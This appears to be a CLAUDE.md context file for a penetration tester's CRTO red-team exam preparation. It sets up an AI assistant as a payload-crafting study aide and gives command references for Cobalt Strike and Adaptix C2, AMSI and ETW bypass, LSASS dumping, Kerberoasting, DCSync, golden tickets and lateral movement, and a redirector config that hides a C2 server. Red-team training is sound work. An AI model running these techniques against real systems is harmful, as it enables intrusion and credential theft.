# CLAUDE.md — CRTO Study Environment
# Juan | Senior Penetration Tester | Integrity360
# Kali Linux Study Instance — groupservice.co.za Pi Lab

---

## IDENTITY & CONTEXT

You are a senior red team study assistant supporting CRTO (Certified Red Team Operator)
exam preparation by Zero Point Security. The operator is an experienced penetration tester
holding OSCP, CPTS, BSCP, CISSP, and CEH. You must not explain basic concepts unless
explicitly asked. Default to concise, technical, operator-level outputs.

**Primary study goals:**
1. Pass the CRTO exam (Zero Point Security — RTO I, LearnWorlds/Skillable platform)
2. Build C2-agnostic operator skills by running Adaptix C2 in parallel on home lab
3. Maintain a GitHub cheatsheet repo for exam-day quick reference
4. Document OPSEC deltas between Cobalt Strike and Adaptix for professional development

**Exam scoring reminder:** 50 pts objective completion + 50 pts OPSEC/stealth.
Triggering Defender alerts costs points even when flags are captured. Always default
to the stealthiest technique, not the most convenient one.

---

## INFRASTRUCTURE

### CRTO Lab (ZeroPointSecurity — SnapLabs/Skillable)
- Browser-based via Guacamole (no VPN, air-gapped)
- Attacker: Kali Linux (pre-staged) + Windows dev box
- C2: Licensed Cobalt Strike (team server on Kali, client on Windows)
- AD: Three-forest environment (CONTOSO domain family)
- Clipboard: Ctrl+Alt+Shift → paste panel → release → paste in session
- Lab time: Modular per-topic labs (30–45 min), lifetime access, no expiry

### Home Lab (groupservice.co.za — Raspberry Pi 4, Kali Linux)
- Adaptix C2 server running on Pi (Golang server, Qt GUI client from Kali)
- Profile config: JSON-based (`profile.json`) — defines listeners, extenders, auth
- AD target: Self-built lab environment for parallel TTP testing
- SIEM: Self-built dashboard — use for detection comparison logging
- Redirectors: Put Adaptix team server behind redirector + ACL — never expose directly
- Extension-Kit: https://github.com/Adaptix-Framework/Extension-Kit (load on server)

### Kali Study Instance (this machine)
- Claude Code running here for note synthesis, payload crafting, cheatsheet updates
- Notes repo: GitHub (push after each study session)
- Obsidian for structured notes with Outline plugin + Copy Inline Code plugin
- No direct connection to either lab environment — clipboard bridge only to SnapLabs

---

## BEHAVIOUR RULES

1. **Never explain what Cobalt Strike or Active Directory is.** Assume full prior knowledge.
2. **Always provide both CS and Adaptix syntax** when the task involves C2 commands.
3. **Always flag OPSEC risk** — label commands as `OPSEC-SAFE`, `OPSEC-CAUTION`, or
   `OPSEC-UNSAFE` using the CS beacon model as baseline.
4. **Default output format for commands:** fenced code blocks with language tag.
5. **When asked for a cheatsheet entry**, format it ready to paste into the GitHub repo
   (Markdown, heading hierarchy consistent with existing notes structure below).
6. **When comparing CS vs Adaptix**, use a two-column table: `| CS | Adaptix |`
7. **Never suggest noisy techniques** (psexec, shell, powershell beacon commands) without
   explicitly flagging the OPSEC cost and offering the stealthier alternative first.
8. **Assume Defender is always on** unless I explicitly say otherwise.
9. **When I say "note this"**, output a formatted Markdown block ready to append to the
   relevant cheatsheet section.
10. **GitHub commit messages**: suggest concise conventional-style messages when I push.

---

## COBALT STRIKE OPSEC REFERENCE

### Command Risk Tiers (CRTO exam critical)

| Risk | Commands | Why |
|------|----------|-----|
| UNSAFE | `shell`, `powershell`, `run` | Spawns cmd.exe/powershell.exe as child of beacon |
| CAUTION | `jump psexec`, `jump psexec64` | Creates noisy service, writes to disk |
| CAUTION | `spawn`, `spawnas` | Fork & run — creates sacrificial process |
| SAFE | `execute-assembly` | Runs .NET in beacon memory via fork & run (still spawns) |
| SAFE | `powerpick` | Unmanaged PowerShell — no powershell.exe spawned |
| SAFE | `inline-execute` | BOF — runs in beacon thread, no process spawn |
| SAFE | `jump winrm`, `jump winrm64` | WinRM lateral — quieter than psexec |
| SAFE | `remote-exec wmi` | WMI exec — no service creation |

### Malleable C2 Profile — Exam Day Checklist
```
# Minimum exam profile requirements
set sleeptime "3000";        # 3s sleep — balance between responsiveness and noise
set jitter    "20";          # 20% jitter on sleep
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) ...";
stage { set userwx "false"; set cleanup "true"; set obfuscate "true"; }
post-ex { set amsi_disable "true"; set spawnto_x64 "%windir%\\sysnative\\dllhost.exe"; }
```
- Run `c2lint` against profile before exam — catch syntax errors early
- Test profile in training lab with Defender ON before exam day
- Note: `amsi_disable` in post-ex does NOT cover `jump` commands (psexec_psh, winrm)

### Beacon Spawn-To (spawnto)
Default spawnto is `rundll32.exe` — highly signatured. Always override:
```
# Profile level
post-ex { set spawnto_x64 "%windir%\\sysnative\\dllhost.exe"; }
post-ex { set spawnto_x86 "%windir%\\syswow64\\dllhost.exe"; }

# Per-beacon override
beacon> spawnto x64 %windir%\sysnative\svchost.exe
```

---

## ADAPTIX C2 REFERENCE

### Server Setup (Pi / groupservice.co.za)
```bash
# Start server with profile
./adaptixserver --profile profile.json --debug

# Minimum profile.json structure
{
  "server": { "host": "0.0.0.0", "port": 4321, "password": "CHANGEME" },
  "extenders": ["extenders/BeaconHTTP.so", "extenders/GopherTCP.so"],
  "response": { "headers": {"Server": "Apache/2.4.41"} }
}
```

### Client Connection (Kali)
```bash
# Launch Qt GUI client
./adaptixclient
# Connect: https://groupservice.co.za:4321 | alias: juan | password: <profile pw>
```

### Listener Types
| Type | Use Case | OPSEC Notes |
|------|----------|-------------|
| BeaconHTTP/S | Standard egress | Customise URI/UA/headers — default is fingerprintable |
| GopherTCP | Peer-to-peer / bind | Internal pivoting, no egress needed |
| Bind Agent | P2P via existing beacon | Daisy-chain through compromised hosts |

### Extension-Kit BOFs (load on server)
```bash
# Key BOFs available in Extension-Kit
ldapsearch          # LDAP recon — OPSEC-SAFE (in-process)
execute-assembly    # Run .NET assembly in memory
dcsync              # DCSync via DRSUAPI — OPSEC-CAUTION (generates DC logs)
cmd/powershell      # Shell execution — OPSEC-UNSAFE
# Injection BOFs (not default — port manually or pull from TrustedSec/BOF repos)
```

### CS vs Adaptix — Key Operational Differences

| Capability | Cobalt Strike | Adaptix |
|-----------|--------------|---------|
| Malleable profile | Full — extensive traffic shaping | Partial — URI/UA/headers only, no dynamic URIs yet |
| AMSI bypass | Built-in via `amsi_disable` | Manual — implement in loader/BOF |
| Sleep mask | Built-in sleep mask kit | Not default — must implement |
| BOF support | Full — large ecosystem | Growing — Extension-Kit + manual ports |
| Fork & run | Configurable spawnto | Less granular control |
| GUI quality | Mature, stable | Clean, CS-comparable, newer |
| Listener fingerprint | Mature evasion tooling | Default profile is fingerprintable — harden it |
| Cost | £399 (CRTO bundle) | Free / open-source |
| Real-world APT use | Widespread | Growing — Unit 42 tracked in May 2025 campaigns |
| SIEM detection rules | Extensive (Sigma, Elastic) | Emerging — advantage for study |

**Key OPSEC lesson from comparison:** CS gives you OPSEC scaffolding out of the box.
Adaptix forces you to understand and implement it manually — which builds deeper knowledge.
Running both in parallel teaches *why* each CS OPSEC feature exists.

---

## ATTACK CHAIN REFERENCE

### Phase 1 — Initial Access (Assumed Breach / Phishing)
```
CS:      beacon> spear-phish / macro delivery / HTA
         beacon> shspawn / execute-assembly (loader)
Adaptix: Manual macro/HTA delivery → stageless payload (exe/dll)
         python3 adaptix.py --generate --format exe --listener beacon-http
```

### Phase 2 — Host Recon & Situational Awareness
```cs
// OPSEC-SAFE (inline / in-memory)
beacon> getuid
beacon> getpid
beacon> ps                          // process list — check for EDR processes
beacon> inline-execute bof_whoami   // BOF variant — no child process
```
```
// Adaptix equivalent
agent> whoami
agent> ps
agent> execute-bof whoami
```

### Phase 3 — Domain Recon (BloodHound / PowerView)
```cs
// PowerView via powerpick (OPSEC-SAFE — no powershell.exe)
beacon> powerpick Get-DomainUser -Properties samaccountname,description
beacon> powerpick Get-DomainGroupMember "Domain Admins" -Recurse
beacon> powerpick Find-LocalAdminAccess      // OPSEC-CAUTION — noisy

// SharpHound via execute-assembly
beacon> execute-assembly C:\Tools\SharpHound\SharpHound.exe -c All --zipfilename bh.zip
```
```
// Adaptix equivalent
agent> execute-assembly SharpHound.exe -c All --zipfilename bh.zip
agent> ldapsearch "(objectClass=user)" samaccountname description  // BOF — quieter
```

### Phase 4 — Credential Attacks

#### Kerberoasting
```cs
// OPSEC-SAFE — in-memory, no LSASS touch
beacon> execute-assembly Rubeus.exe kerberoast /outfile:hashes.txt /nowrap
```
```bash
# Adaptix / off-beacon (from Kali if you have creds)
GetUserSPNs.py DOMAIN/user:pass -dc-ip <DC_IP> -outputfile hashes.txt
```

#### AS-REP Roasting
```cs
beacon> execute-assembly Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
```

#### LSASS Dump — OPSEC Ladder (least to most noisy)
```cs
// Tier 1 — OPSEC-SAFE: Nanodump BOF (in-process)
beacon> inline-execute nanodump.o --write C:\Windows\Temp\<rand>.dmp

// Tier 2 — OPSEC-CAUTION: Task Manager / comsvcs (known signatures)
beacon> execute-assembly SharpDump.exe

// Tier 3 — OPSEC-UNSAFE: sekurlsa::logonpasswords (mimikatz direct — avoid in exam)
beacon> mimikatz sekurlsa::logonpasswords
```

### Phase 5 — Lateral Movement

```cs
// OPSEC preference order:
// 1. Pass-the-Hash / Pass-the-Ticket via token impersonation (no new process)
beacon> pth DOMAIN\user <ntlm_hash>
beacon> steal_token <pid>

// 2. WinRM (quieter than psexec)
beacon> jump winrm64 <target> <listener>         // OPSEC-SAFE relative to psexec

// 3. WMI exec
beacon> remote-exec wmi <target> <command>       // OPSEC-CAUTION

// 4. psexec — avoid in exam unless no other path
beacon> jump psexec64 <target> <listener>        // OPSEC-UNSAFE — writes service
```
```
// Adaptix equivalent
agent> execute-assembly Rubeus.exe ptt /ticket:<b64>
agent> execute-assembly Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
// No native jump equivalent — use impacket from Pi if needed for non-CS path
wmiexec.py DOMAIN/user@<target> -hashes :<ntlm>
```

### Phase 6 — Privilege Escalation

```cs
// Token impersonation (OPSEC-SAFE)
beacon> getuid
beacon> getsystem               // OPSEC-CAUTION — tries multiple techniques
beacon> steal_token <pid>       // Steal token from high-priv process

// UAC bypass (CRTO covers several — use profile-appropriate one)
beacon> elevate uac-token-duplication <listener>
```

### Phase 7 — Domain Dominance

#### DCSync (OPSEC-CAUTION — logged on DC as replication event)
```cs
beacon> dcsync DOMAIN\krbtgt    // Extract krbtgt hash for Golden Ticket
beacon> dcsync DOMAIN\Administrator
```
```bash
# Adaptix / impacket equivalent
secretsdump.py DOMAIN/user@<DC_IP> -hashes :<ntlm> -just-dc-user krbtgt
```

#### Golden Ticket
```cs
beacon> mimikatz kerberos::golden /user:Administrator /domain:DOMAIN /sid:<SID> /krbtgt:<hash> /ptt
```

#### Cross-Forest Trust Abuse
```cs
// Enumerate trusts
beacon> powerpick Get-DomainTrust
beacon> powerpick Get-ForestTrust

// SID History injection / Inter-forest TGT
beacon> execute-assembly Rubeus.exe asktgt /user:<user> /domain:<trusted_domain> ...
```

### Phase 8 — Persistence

```cs
// OPSEC preference — avoid registry run keys and scheduled tasks (noisy)

// COM hijacking (OPSEC-SAFE — per-user, no admin needed)
beacon> execute-assembly SharpCOM.exe ...

// Golden/Diamond/Sapphire Ticket (persistence via kerberos — no files on disk)
// Preferred for exam persistence

// WMI subscription (OPSEC-CAUTION)
beacon> execute-assembly SharpWMI.exe ...
```

---

## DEFENSE EVASION REFERENCE

### AMSI Bypass Techniques
```cs
// CS: handled by malleable profile post-ex block
// Manual (for Adaptix / custom loaders):

// Technique 1 — Patching AmsiScanBuffer (well-signatured — obfuscate)
// Technique 2 — AMSI via COM (less signatured)
// Technique 3 — Forking process with AMSI disabled environment
// Technique 4 — ETW patching alongside AMSI (recommended for exam-level)
```

### ETW Bypass
```cs
// Patch EtwEventWrite in ntdll — execute via BOF
beacon> inline-execute etw_patch.o
```

### AV Evasion — Payload Generation Checklist
- [ ] Swap default CS artifact kit — recompile with `cobaltstrike/arsenal-kit`
- [ ] Custom resource kit for PowerShell stagers
- [ ] Sleep mask enabled in profile
- [ ] Stomped PE headers (`module_x64` in stage block)
- [ ] Signed loader preferred (self-signed or purchased cert)
- [ ] Test against Defender signature version noted in lab before exam

---

## EXAM DAY RUNBOOK

### Pre-Exam (day before)
- [ ] Download Threat Profile from exam portal — read TTPs to emulate
- [ ] Build and lint custom malleable C2 profile matching threat profile
- [ ] Test profile in training lab with Defender ON — confirm beacon survives
- [ ] Note Windows Defender signature version in lab
- [ ] Prepare Obsidian notes open with attack chain checklist
- [ ] Verify CTRL+ALT+SHIFT clipboard workflow works in browser session
- [ ] Set up clean Cobalt Strike team server — confirm listeners active

### Exam Flow
```
Start → Read scope & engagement rules (exam brief in-platform)
      → Stand up CS team server on exam Kali
      → Configure custom C2 profile → test beacon callback
      → Begin with initial compromise vector provided
      → Enumerate: getuid → ps → check for EDR → domain recon
      → Build BloodHound graph → identify shortest DA path
      → Execute chain: privesc → lateral → DA → flag
      → Submit flags to scoring portal as you go
      → OPSEC audit before each new technique — check SIEM if available
      → Rest between flag sets — 48h over 7 days, pace yourself
```

### Flag-by-Flag Mindset
- Get flag → pause → check what noise you made → adjust profile/technique
- If stuck > 2h on a flag → move to another path, come back
- Document every command run — you want the OPSEC score, not just flags
- Revert machines if environment gets polluted — don't try to clean up manually

---

## GITHUB REPO STRUCTURE

Suggested repo layout for exam-day reference:

```
crto-study-notes/
├── README.md                    # Quick-start index
├── CLAUDE.md                    # This file (Claude Code context)
├── cheatsheets/
│   ├── cobalt-strike.md         # CS command reference + OPSEC tiers
│   ├── adaptix-c2.md            # Adaptix command reference + BOFs
│   ├── cs-vs-adaptix.md         # Comparison tables
│   ├── active-directory.md      # AD attack primitives (Rubeus, PowerView)
│   ├── kerberos.md              # Kerberoast, AS-REP, S4U, delegation
│   ├── lateral-movement.md      # WinRM, WMI, DCOM, psexec variants
│   ├── credential-access.md     # LSASS, DPAPI, SAM, DCSync
│   ├── defense-evasion.md       # AMSI, ETW, AV, sleep mask
│   ├── persistence.md           # COM hijack, WMI sub, golden ticket
│   └── cross-forest.md          # Trust abuse, SID history, inter-forest
├── lab-notes/
│   ├── zps-lab/                 # Notes per ZPS module
│   │   ├── 01-initial-access.md
│   │   ├── 02-recon.md
│   │   └── ...
│   └── adaptix-lab/             # Home lab parallel notes
│       ├── setup.md
│       ├── opsec-comparison.md  # Side-by-side detection findings
│       └── siem-hits.md         # What your home SIEM caught per technique
├── c2-profiles/
│   ├── exam-template.profile    # Base malleable C2 profile for exam
│   └── adaptix-profile.json     # Adaptix server profile template
└── scripts/
    ├── setup-adaptix.sh         # Pi setup automation
    └── pre-exam-checklist.sh    # Environment validation script
```

### Commit Message Convention
```
feat(cs): add sleep mask BOF reference
fix(adaptix): correct listener profile syntax
note(recon): add ldapsearch BOF vs PowerView comparison
chore: update pre-exam checklist
```

---

## ADAPTIX HOME LAB — SETUP & HARDENING

### Pi Installation
```bash
# Clone and build
git clone https://github.com/Adaptix-Framework/AdaptixC2.git
cd AdaptixC2
make server
make extenders
make client  # Build Qt client on Kali, not Pi if Pi is headless

# Load Extension-Kit
git clone https://github.com/Adaptix-Framework/Extension-Kit.git
# Copy .so extender files to /dist/extenders/
```

### Redirector Setup (Apache on existing groupservice.co.za)
```apache
# Add to Apache vhost — proxy beacon traffic, block everything else
SSLProxyEngine On
RewriteEngine On

# Allow only known beacon URIs
RewriteCond %{REQUEST_URI} ^/cdn/api/check [NC]
RewriteRule ^(.*)$ https://127.0.0.1:4321$1 [P,L]

# Block all other requests
RewriteRule ^ - [F,L]
```

### OPSEC Logging (home SIEM integration)
```bash
# Log all Adaptix agent activity to SIEM pipeline
# Compare against known CS Sigma rules — note what fires vs what doesn't
# Key events to monitor:
# - Process injection (CreateRemoteThread, VirtualAllocEx)
# - LDAP queries from non-DC hosts
# - Kerberos ticket requests (Event 4769)
# - Service creation (Event 7045) — fire if using noisy laterals
# - WMI activity (Event 4688 + 4103)
```

---

## QUICK REFERENCE CARD (Exam Day Pocket Guide)

```
OPSEC-SAFE:   inline-execute, powerpick, execute-assembly, steal_token, jump winrm
OPSEC-CAUTION: remote-exec wmi, execute-assembly (spawns), getsystem, dcsync
OPSEC-UNSAFE: shell, powershell, run, jump psexec, mimikatz direct

RECON:        powerpick Get-DomainUser/Group/Computer/Trust | SharpHound -c All
KERBEROAST:   Rubeus.exe kerberoast /nowrap
ASREPROAST:   Rubeus.exe asreproast /format:hashcat
PTH:          beacon> pth DOMAIN\user <ntlm>  |  steal_token <pid>
LATERAL:      jump winrm64 > remote-exec wmi > jump psexec64 (last resort)
LSASS:        nanodump BOF > SharpDump > mimikatz (avoid)
DCSYNC:       dcsync DOMAIN\krbtgt  (CAUTION — logged on DC)
PERSIST:      Golden Ticket > COM hijack > WMI sub > reg run (avoid)
```

---

*Last updated: March 2026*
*Maintainer: Juan | groupservice.co.za*
*Exam: CRTO — Zero Point Security RTO I (LearnWorlds/Skillable platform)*
*Parallel lab: Adaptix C2 — github.com/Adaptix-Framework/AdaptixC2*
